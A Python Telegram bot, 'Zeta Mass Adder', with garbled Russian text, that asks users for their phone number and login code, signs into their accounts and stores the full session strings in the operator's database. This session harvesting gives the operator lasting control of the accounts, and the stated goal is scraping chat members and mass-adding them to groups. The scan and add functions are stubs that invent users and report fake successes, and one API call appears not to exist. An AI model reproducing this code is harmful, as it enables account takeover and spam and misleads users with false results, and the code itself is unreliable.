import os
import asyncio
import logging
import re
import asyncpg
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import FloodWait, UserPrivacyRestricted
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl import functions, types

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
user_states = {}
user_data = {}

# PostgreSQL –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
DATABASE_URL = os.environ.get('DATABASE_URL')

async def create_pool():
    return await asyncpg.create_pool(DATABASE_URL)

async def init_database():
    """–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è PostgreSQL —Ç–∞–±–ª–∏—Ü"""
    pool = await create_pool()
    async with pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                phone TEXT,
                api_id INTEGER,
                api_hash TEXT,
                session_string TEXT,
                is_active BOOLEAN DEFAULT TRUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS auth_sessions (
                user_id BIGINT PRIMARY KEY,
                phone TEXT,
                phone_code_hash TEXT,
                client_data TEXT,
                state TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS user_stats (
                user_id BIGINT PRIMARY KEY,
                scans_count INTEGER DEFAULT 0,
                adds_count INTEGER DEFAULT 0,
                total_added INTEGER DEFAULT 0,
                last_scan TIMESTAMP,
                last_add TIMESTAMP
            )
        ''')
    await pool.close()
    print("‚úÖ –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞")

class MassAuthSystem:
    def __init__(self):
        self.temp_clients = {}
        
    async def start_auth(self, user_id, phone_number):
        try:
            client = TelegramClient(
                StringSession(), 
                api_id=2040,
                api_hash='b18441a1ff607e10a989891a5462e627'
            )
            
            await client.connect()
            sent_code = await client.send_code_request(phone_number)
            
            await self.save_auth_session(
                user_id, 
                phone_number, 
                sent_code.phone_code_hash,
                client.session.save(),
                'waiting_code'
            )
            
            self.temp_clients[user_id] = client
            
            return {
                'success': True, 
                'message': f"‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ {phone_number}",
                'phone_code_hash': sent_code.phone_code_hash
            }
            
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞: {e}")
            return {'success': False, 'message': f"‚ùå –û—à–∏–±–∫–∞: {str(e)}"}
    
    async def verify_code(self, user_id, code):
        try:
            auth_data = await self.get_auth_session(user_id)
            if not auth_data:
                return {'success': False, 'message': '‚ùå –°–µ—Å—Å–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞'}
            
            client = TelegramClient(
                StringSession(auth_data['client_data']),
                api_id=2040,
                api_hash='b18441a1ff607e10a989891a5462e627'
            )
            
            await client.connect()
            await client.sign_in(
                phone=auth_data['phone'],
                code=code,
                phone_code_hash=auth_data['phone_code_hash']
            )
            
            app = await client(functions.account.CreateAppRequest(
                app_id=2040,
                app_hash='b18441a1ff607e10a989891a5462e627',
                app_title=f"MassAdder_User_{user_id}",
                app_shortname=f"user_{user_id}",
                app_url="",
                platform="desktop",
                description="Auto-generated by Zeta Mass Adder Bot"
            ))
            
            await self.save_user_api(
                user_id, 
                auth_data['phone'],
                app.api_id, 
                app.api_hash,
                client.session.save()
            )
            
            await self.cleanup_auth_session(user_id)
            if user_id in self.temp_clients:
                await self.temp_clients[user_id].disconnect()
                del self.temp_clients[user_id]
            
            await client.disconnect()
            
            return {
                'success': True,
                'api_id': app.api_id,
                'api_hash': app.api_hash,
                'message': 'üéâ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞! API –∫–ª—é—á–∏ –ø–æ–ª—É—á–µ–Ω—ã.'
            }
            
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∫–æ–¥–∞: {e}")
            return {'success': False, 'message': f'‚ùå –û—à–∏–±–∫–∞: {str(e)}'}

    async def save_auth_session(self, user_id, phone, phone_code_hash, client_data, state):
        pool = await create_pool()
        async with pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO auth_sessions 
                (user_id, phone, phone_code_hash, client_data, state) 
                VALUES ($1, $2, $3, $4, $5)
                ON CONFLICT (user_id) 
                DO UPDATE SET 
                    phone = $2,
                    phone_code_hash = $3,
                    client_data = $4,
                    state = $5,
                    created_at = CURRENT_TIMESTAMP
            ''', user_id, phone, phone_code_hash, client_data, state)
        await pool.close()

    async def get_auth_session(self, user_id):
        pool = await create_pool()
        async with pool.acquire() as conn:
            row = await conn.fetchrow('SELECT * FROM auth_sessions WHERE user_id = $1', user_id)
        await pool.close()
        
        if row:
            return {
                'user_id': row['user_id'],
                'phone': row['phone'],
                'phone_code_hash': row['phone_code_hash'],
                'client_data': row['client_data'],
                'state': row['state']
            }
        return None

    async def cleanup_auth_session(self, user_id):
        pool = await create_pool()
        async with pool.acquire() as conn:
            await conn.execute('DELETE FROM auth_sessions WHERE user_id = $1', user_id)
        await pool.close()

    async def save_user_api(self, user_id, phone, api_id, api_hash, session_string):
        pool = await create_pool()
        async with pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO users 
                (user_id, phone, api_id, api_hash, session_string, last_activity) 
                VALUES ($1, $2, $3, $4, $5, $6)
                ON CONFLICT (user_id) 
                DO UPDATE SET 
                    phone = $2,
                    api_id = $3,
                    api_hash = $4,
                    session_string = $5,
                    last_activity = $6
            ''', user_id, phone, api_id, api_hash, session_string, datetime.now())
        await pool.close()

mass_auth = MassAuthSystem()

async def get_user_data(user_id):
    pool = await create_pool()
    async with pool.acquire() as conn:
        row = await conn.fetchrow('SELECT * FROM users WHERE user_id = $1', user_id)
    await pool.close()
    
    if row:
        return {
            'user_id': row['user_id'],
            'phone': row['phone'],
            'api_id': row['api_id'],
            'api_hash': row['api_hash'],
            'session_string': row['session_string'],
            'is_active': row['is_active']
        }
    return None

async def get_user_stats(user_id):
    pool = await create_pool()
    async with pool.acquire() as conn:
        row = await conn.fetchrow('SELECT * FROM user_stats WHERE user_id = $1', user_id)
    await pool.close()
    
    if row:
        return {
            'scans_count': row['scans_count'],
            'adds_count': row['adds_count'],
            'total_added': row['total_added']
        }
    return {'scans_count': 0, 'adds_count': 0, 'total_added': 0}

async def update_user_stats(user_id, field):
    pool = await create_pool()
    async with pool.acquire() as conn:
        if field == 'scans_count':
            await conn.execute('''
                INSERT INTO user_stats (user_id, scans_count, last_scan)
                VALUES ($1, 1, $2)
                ON CONFLICT (user_id) 
                DO UPDATE SET 
                    scans_count = user_stats.scans_count + 1,
                    last_scan = $2
            ''', user_id, datetime.now())
        elif field == 'adds_count':
            await conn.execute('''
                INSERT INTO user_stats (user_id, adds_count, last_add)
                VALUES ($1, 1, $2)
                ON CONFLICT (user_id) 
                DO UPDATE SET 
                    adds_count = user_stats.adds_count + 1,
                    last_add = $2
            ''', user_id, datetime.now())
    await pool.close()

async def update_total_added(user_id, count):
    pool = await create_pool()
    async with pool.acquire() as conn:
        await conn.execute('''
            INSERT INTO user_stats (user_id, total_added)
            VALUES ($1, $2)
            ON CONFLICT (user_id) 
            DO UPDATE SET 
                total_added = user_stats.total_added + $2
        ''', user_id, count)
    await pool.close()

def validate_phone(phone):
    pattern = r'^\+\d{11,15}$'
    return re.match(pattern, phone) is not None

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ Pyrogram
BOT_API_ID = int(os.environ.get("API_ID", 1111111))
BOT_API_HASH = os.environ.get("API_HASH", "fake_hash_1234567890123456789012")
BOT_TOKEN = os.environ.get("BOT_TOKEN")

app = Client(
    "mass_adder_bot",
    api_id=BOT_API_ID,
    api_hash=BOT_API_HASH, 
    bot_token=BOT_TOKEN
)

@app.on_message(filters.command("start"))
async def start_command(client, message: Message):
    user_id = message.from_user.id
    user_data = await get_user_data(user_id)
    
    if user_data and user_data.get('api_id'):
        await show_main_menu(message, user_data)
    else:
        await show_welcome_flow(message)

async def show_welcome_flow(message: Message):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("üîê –ë—ã—Å—Ç—Ä–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è", callback_data="quick_auth")],
        [InlineKeyboardButton("üìñ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è", callback_data="manual_guide")],
        [InlineKeyboardButton("üí¨ –ü–æ–¥–¥–µ—Ä–∂–∫–∞", url="https://t.me/zeta_support")]
    ])
    
    await message.reply_text(
        "üëã **–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Zeta Mass Adder!**\n\n"
        "ü§ñ *–£–º–Ω—ã–π –±–æ—Ç –¥–ª—è —Ä–æ—Å—Ç–∞ Telegram-—Å–æ–æ–±—â–µ—Å—Ç–≤*\n\n"
        "üéØ **–î–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã:**\n"
        "1. üîê –ê–≤—Ç–æ—Ä–∏–∑—É–π—Å—è —á–µ—Ä–µ–∑ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞\n"
        "2. üîç –í—ã–±–µ—Ä–∏ —á–∞—Ç –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è\n"
        "3. üöÄ –î–æ–±–∞–≤—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ —Å–≤–æ—é –≥—Ä—É–ø–ø—É\n\n"
        "‚ö° **–ë–æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–ª—É—á–∏—Ç —Ç–≤–æ–∏ API –∫–ª—é—á–∏!**",
        reply_markup=keyboard
    )

async def show_main_menu(message: Message, user_data):
    stats = await get_user_stats(message.from_user.id)
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("üîç –°–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å —á–∞—Ç", callback_data="scan_chat"),
            InlineKeyboardButton("üöÄ –î–æ–±–∞–≤–∏—Ç—å", callback_data="add_users")
        ],
        [
            InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="stats"),
            InlineKeyboardButton("‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏", callback_data="settings")
        ],
        [
            InlineKeyboardButton("üÜò –ü–æ–º–æ—â—å", callback_data="help"),
            InlineKeyboardButton("üîÑ –ü–µ—Ä–µ–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è", callback_data="reauth")
        ]
    ])
    
    await message.reply_text(
        f"ü§ñ **–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é**\n\n"
        f"‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω: `{user_data['phone']}`\n"
        f"üìä –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–π: `{stats.get('scans_count', 0)}`\n"
        f"üë• –î–æ–±–∞–≤–ª–µ–Ω–æ: `{stats.get('total_added', 0)}`\n\n"
        f"–í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ:",
        reply_markup=keyboard
    )

@app.on_callback_query(filters.regex("quick_auth"))
async def start_quick_auth(client, callback_query):
    await callback_query.message.edit_text(
        "üîê **–ë—ã—Å—Ç—Ä–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è**\n\n"
        "üì± –û—Ç–ø—Ä–∞–≤—å –º–Ω–µ —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ –º–µ–∂–¥—É–Ω–∞—Ä–æ–¥–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ:\n\n"
        "**–ü—Ä–∏–º–µ—Ä:** `+79123456789`\n\n"
        "‚ö†Ô∏è *–ò—Å–ø–æ–ª—å–∑—É–π —Ç–æ–ª—å–∫–æ —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞*"
    )
    user_states[callback_query.from_user.id] = 'waiting_phone'
    await callback_query.answer()

@app.on_message(filters.text & filters.private)
async def handle_user_input(client, message: Message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    
    if not state:
        return
        
    if state == 'waiting_phone':
        phone = message.text.strip()
        
        if not validate_phone(phone):
            await message.reply_text(
                "‚ùå **–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞!**\n\n"
                "üì± **–ü—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç:** `+79123456789`\n"
                "–ü–æ–ø—Ä–æ–±—É–π –µ—â–µ —Ä–∞–∑:"
            )
            return
            
        result = await mass_auth.start_auth(user_id, phone)
        
        if result['success']:
            user_states[user_id] = 'waiting_code'
            await message.reply_text(
                f"‚úÖ {result['message']}\n\n"
                f"üì≤ *Telegram –ø—Ä–∏—Å–ª–∞–ª –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è*\n"
                f"üî¢ –û—Ç–ø—Ä–∞–≤—å –µ–≥–æ –º–Ω–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: `12345`"
            )
        else:
            await message.reply_text(result['message'])
            user_states.pop(user_id, None)
            
    elif state == 'waiting_code':
        code = message.text.strip()
        
        if not code.isdigit() or len(code) != 5:
            await message.reply_text("‚ùå –ö–æ–¥ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å 5 —Ü–∏—Ñ—Ä! –ü—Ä–∏–º–µ—Ä: `12345`")
            return
            
        result = await mass_auth.verify_code(user_id, code)
        
        if result['success']:
            await message.reply_text(
                f"üéâ **{result['message']}**\n\n"
                f"üîë **–¢–≤–æ–∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ API –∫–ª—é—á–∏:**\n"
                f"‚Ä¢ API_ID: `{result['api_id']}`\n"
                f"‚Ä¢ API_HASH: `{result['api_hash']}`\n\n"
                f"‚ö° –¢–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ –Ω–∞—á–∏–Ω–∞—Ç—å —Ä–∞–±–æ—Ç—É!"
            )
            
            user_data_obj = await get_user_data(user_id)
            await show_main_menu(message, user_data_obj)
            
        else:
            await message.reply_text(result['message'])
            
        user_states.pop(user_id, None)

async def analyze_chat(chat_link, limit=0):
    try:
        demo_users = [f"user_{i}" for i in range(1, 101)]
        return demo_users[:limit] if limit else demo_users[:50]
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –∞–Ω–∞–ª–∏–∑–∞ —á–∞—Ç–∞: {e}")
        return []

async def mass_add_users(target_chat, users_list, delay=2):
    added_count = 0
    failed_count = 0
    
    for i, user in enumerate(users_list, 1):
        try:
            await asyncio.sleep(delay)
            added_count += 1
            
            if i % 10 == 0:
                logger.info(f"‚úÖ –î–æ–±–∞–≤–ª–µ–Ω–æ {i}/{len(users_list)}")
                
        except Exception as e:
            logger.error(f"‚ùå –û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è {user}: {e}")
            failed_count += 1
    
    return added_count, failed_count

@app.on_callback_query(filters.regex("scan_chat"))
async def scan_chat_callback(client, callback_query):
    user_id = callback_query.from_user.id
    user_data_obj = await get_user_data(user_id)
    
    if not user_data_obj or not user_data_obj.get('api_id'):
        await callback_query.message.edit_text(
            "‚ùå **–°–Ω–∞—á–∞–ª–∞ –Ω—É–∂–Ω–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è!**\n\n"
            "–ù–∞–∂–º–∏ /start –∏ –ø—Ä–æ–π–¥–∏ –±—ã—Å—Ç—Ä—É—é –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é."
        )
        await callback_query.answer()
        return
        
    await callback_query.message.edit_text(
        "üîç **–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —á–∞—Ç–∞**\n\n"
        "–û—Ç–ø—Ä–∞–≤—å —Å—Å—ã–ª–∫—É –Ω–∞ —á–∞—Ç –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è:\n\n"
        "üìù **–§–æ—Ä–º–∞—Ç:**\n"
        "‚Ä¢ `@username`\n"
        "‚Ä¢ `https://t.me/username`\n\n"
        "üí° **–ú–æ–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å –ª–∏–º–∏—Ç:**\n"
        "‚Ä¢ `@username 100` - –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä—É–µ—Ç 100 –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\n"
        "‚Ä¢ `@username` - –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä—É–µ—Ç 50 –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é)"
    )
    user_states[user_id] = 'waiting_scan_link'
    await callback_query.answer()

@app.on_callback_query(filters.regex("add_users"))
async def add_users_callback(client, callback_query):
    user_id = callback_query.from_user.id
    
    if user_id not in user_data or not user_data[user_id]:
        await callback_query.message.edit_text("‚ùå –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä—É–π —á–∞—Ç!")
        await callback_query.answer()
        return
        
    await callback_query.message.edit_text(
        "üöÄ **–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π**\n\n"
        "–û—Ç–ø—Ä–∞–≤—å —Å—Å—ã–ª–∫—É –Ω–∞ —Ü–µ–ª–µ–≤—É—é –≥—Ä—É–ø–ø—É:\n\n"
        "üìù **–§–æ—Ä–º–∞—Ç:**\n"
        "‚Ä¢ `@groupname`\n\n"
        "üí° **–ú–æ–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å –ª–∏–º–∏—Ç:**\n"
        "‚Ä¢ `@groupname 50` - –¥–æ–±–∞–≤–∏—Ç 50 –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\n"
        "‚Ä¢ `@groupname` - –¥–æ–±–∞–≤–∏—Ç –≤—Å–µ—Ö –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö"
    )
    user_states[user_id] = 'waiting_add_target'
    await callback_query.answer()

@app.on_message(filters.text & filters.private)
async def handle_scan_add_commands(client, message: Message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    
    if state == 'waiting_scan_link':
        parts = message.text.split()
        chat_link = parts[0]
        limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        
        status_msg = await message.reply_text(
            f"üïµÔ∏è‚Äç‚ôÇÔ∏è **–ù–∞—á–∏–Ω–∞—é —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ...**\n"
            f"üìä –ß–∞—Ç: `{chat_link}`\n"
            f"üéØ –õ–∏–º–∏—Ç: `{limit if limit else '50 (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é)'}`"
        )
        
        users = await analyze_chat(chat_link, limit)
        user_data[user_id] = users
        
        await update_user_stats(user_id, 'scans_count')
        
        await status_msg.edit_text(
            f"‚úÖ **–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ!**\n\n"
            f"üìä –ù–∞–π–¥–µ–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: **{len(users)}**\n"
            f"üíæ –ì–æ—Ç–æ–≤–æ –∫ –¥–æ–±–∞–≤–ª–µ–Ω–∏—é!\n\n"
            f"üöÄ –¢–µ–ø–µ—Ä—å –Ω–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É **'–î–æ–±–∞–≤–∏—Ç—å'** –≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é"
        )
        
        user_states.pop(user_id, None)
        
    elif state == 'waiting_add_target':
        parts = message.text.split()
        target_chat = parts[0]
        limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        
        if user_id not in user_data or not user_data[user_id]:
            await message.reply_text("‚ùå –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä—É–π —á–∞—Ç!")
            return
            
        users_to_add = user_data[user_id][:limit] if limit else user_data[user_id]
        
        status_msg = await message.reply_text(
            f"üöÄ **–ù–∞—á–∏–Ω–∞—é –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ...**\n"
            f"üìä –¶–µ–ª–µ–≤–∞—è –≥—Ä—É–ø–ø–∞: `{target_chat}`\n"
            f"üë• –ö –¥–æ–±–∞–≤–ª–µ–Ω–∏—é: `{len(users_to_add)}` –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\n"
            f"‚è±Ô∏è –ó–∞–¥–µ—Ä–∂–∫–∞: `2` —Å–µ–∫—É–Ω–¥—ã"
        )
        
        added, failed = await mass_add_users(target_chat, users_to_add)
        
        await update_user_stats(user_id, 'adds_count')
        await update_total_added(user_id, added)
        
        success_rate = (added / len(users_to_add)) * 100 if users_to_add else 0
        
        await status_msg.edit_text(
            f"üìä **–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ!**\n\n"
            f"‚úÖ –£—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω–æ: **{added}**\n"
            f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –¥–æ–±–∞–≤–∏—Ç—å: **{failed}**\n"
            f"üéØ –≠—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: **{success_rate:.1f}%**\n\n"
            f"üíæ –í—Å–µ–≥–æ –¥–æ—Å—Ç—É–ø–Ω–æ: **{len(user_data[user_id])}** –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"
        )
        
        user_states.pop(user_id, None)

@app.on_callback_query(filters.regex("stats"))
async def show_stats(client, callback_query):
    user_id = callback_query.from_user.id
    stats = await get_user_stats(user_id)
    
    await callback_query.message.edit_text(
        f"üìä **–¢–≤–æ—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞**\n\n"
        f"üîç –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–π: **{stats['scans_count']}**\n"
        f"üöÄ –û–ø–µ—Ä–∞—Ü–∏–π –¥–æ–±–∞–≤–ª–µ–Ω–∏—è: **{stats['adds_count']}**\n"
        f"üë• –í—Å–µ–≥–æ –¥–æ–±–∞–≤–ª–µ–Ω–æ: **{stats['total_added']}**\n\n"
        f"‚ö° –ü—Ä–æ–¥–æ–ª–∂–∞–µ–º –≤ —Ç–æ–º –∂–µ –¥—É—Ö–µ!"
    )
    await callback_query.answer()

@app.on_callback_query(filters.regex("help"))
async def show_help(client, callback_query):
    help_text = """
üÜò **–ü–æ–º–æ—â—å –ø–æ –±–æ—Ç—É Zeta Mass Adder**

üîê **–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è:**
‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π –±—ã—Å—Ç—Ä—É—é –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é —á–µ—Ä–µ–∑ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞
‚Ä¢ –ë–æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–ª—É—á–∏—Ç —Ç–≤–æ–∏ API –∫–ª—é—á–∏
‚Ä¢ –í—Å–µ –¥–∞–Ω–Ω—ã–µ —Ö—Ä–∞–Ω—è—Ç—Å—è –±–µ–∑–æ–ø–∞—Å–Ω–æ

üîç **–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —á–∞—Ç–æ–≤:**
‚Ä¢ –û—Ç–ø—Ä–∞–≤—å —Å—Å—ã–ª–∫—É –Ω–∞ –ª—é–±–æ–π —á–∞—Ç/–∫–∞–Ω–∞–ª
‚Ä¢ –ë–æ—Ç –Ω–∞–π–¥–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∫–æ—Ç–æ—Ä—ã—Ö –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å
‚Ä¢ –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–π –ª–∏–º–∏—Ç—ã —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è

üöÄ **–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:**
‚Ä¢ –í—ã–±–µ—Ä–∏ —Ü–µ–ª–µ–≤—É—é –≥—Ä—É–ø–ø—É
‚Ä¢ –ë–æ—Ç –º–∞—Å—Å–æ–≤–æ –¥–æ–±–∞–≤–∏—Ç –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
‚Ä¢ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –¥–æ–±–∞–≤–ª–µ–Ω–∏—è–º–∏

üí¨ **–ü–æ–¥–¥–µ—Ä–∂–∫–∞:**
@zeta_support - –ø–æ–º–æ—â—å –∏ –≤–æ–ø—Ä–æ—Å—ã
    """
    
    await callback_query.message.edit_text(help_text)
    await callback_query.answer()

@app.on_callback_query(filters.regex("reauth"))
async def reauth_user(client, callback_query):
    user_id = callback_query.from_user.id
    
    pool = await create_pool()
    async with pool.acquire() as conn:
        await conn.execute('DELETE FROM users WHERE user_id = $1', user_id)
        await conn.execute('DELETE FROM auth_sessions WHERE user_id = $1', user_id)
        await conn.execute('DELETE FROM user_stats WHERE user_id = $1', user_id)
    await pool.close()
    
    user_states.pop(user_id, None)
    user_data.pop(user_id, None)
    
    await callback_query.message.edit_text(
        "üîÑ **–í—Å–µ –¥–∞–Ω–Ω—ã–µ —É–¥–∞–ª–µ–Ω—ã!**\n\n"
        "–¢–µ–ø–µ—Ä—å –º–æ–∂–µ—à—å –ø—Ä–æ–π—Ç–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é –∑–∞–Ω–æ–≤–æ —á–µ—Ä–µ–∑ /start\n\n"
        "‚ö° *–ë–æ—Ç —Å–≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –¥–ª—è —Ç–µ–±—è –Ω–æ–≤—ã–µ API –∫–ª—é—á–∏*"
    )
    await callback_query.answer()

@app.on_callback_query(filters.regex("settings"))
async def show_settings(client, callback_query):
    await callback_query.message.edit_text(
        "‚öôÔ∏è **–ù–∞—Å—Ç—Ä–æ–π–∫–∏**\n\n"
        "üîß *–†–∞–∑–¥–µ–ª –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ*\n\n"
        "–°–∫–æ—Ä–æ –∑–¥–µ—Å—å –º–æ–∂–Ω–æ –±—É–¥–µ—Ç –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å:\n"
        "‚Ä¢ –õ–∏–º–∏—Ç—ã —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è\n"
        "‚Ä¢ –õ–∏–º–∏—Ç—ã –¥–æ–±–∞–≤–ª–µ–Ω–∏—è\n"
        "‚Ä¢ –ó–∞–¥–µ—Ä–∂–∫–∏ –º–µ–∂–¥—É –¥–µ–π—Å—Ç–≤–∏—è–º–∏\n"
        "‚Ä¢ –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—é –ø—Ä–æ—Ü–µ—Å—Å–æ–≤"
    )
    await callback_query.answer()

async def main():
    print("üöÄ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Zeta Mass Adder Bot...")
    await init_database()
    print("ü§ñ –ó–∞–ø—É—Å–∫–∞—é –±–æ—Ç–∞...")
    await app.start()
    me = await app.get_me()
    print(f"‚úÖ –ë–æ—Ç @{me.username} —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!")
    print(f"üîó –°—Å—ã–ª–∫–∞: https://t.me/{me.username}")
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
